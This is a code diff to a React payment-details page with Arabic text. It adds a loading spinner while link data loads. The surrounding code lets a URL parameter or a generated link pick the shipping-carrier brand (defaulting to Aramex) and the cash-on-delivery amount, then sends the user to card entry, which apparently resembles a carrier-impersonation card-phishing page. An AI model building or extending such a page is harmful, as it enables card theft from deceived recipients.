@@ -8,7 +8,7 @@ import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
   
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -16,6 +16,24 @@ const PaymentDetails = () => {
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  
+  // Show loading state
+  if (isLoading) {
+    return (
+      <DynamicPaymentLayout
+        serviceName="جاري التحميل..."
+        serviceKey="aramex"
+        amount="..."
+        title="تفاصيل الدفع"
+        description="جاري تحميل البيانات..."
+        icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      >
+        <div className="flex items-center justify-center py-12">
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
+        </div>
+      </DynamicPaymentLayout>
+    );
+  }
   
   const handleProceed = () => {
     // Navigate directly to card input - bank is already set from link creation
